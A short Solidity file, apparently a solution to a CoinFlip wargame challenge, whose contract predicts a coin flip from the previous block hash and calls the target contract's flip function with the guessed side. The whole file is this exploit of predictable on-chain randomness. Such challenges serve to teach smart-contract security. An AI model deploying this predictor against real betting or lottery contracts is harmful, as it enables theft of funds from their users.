pragma solidity ^0.4.24;

contract CoinFlip {
  function flip(bool) public returns (bool) {}
}

contract DelegateCall {
    CoinFlip cf = CoinFlip(address(0x81c5e0F50f47beE7609409cBd4e95da99A7a04C9));
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    
    function guessFlip() public {
        uint256 blockValue = uint256(block.blockhash(block.number-1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        cf.flip(side);
    }
}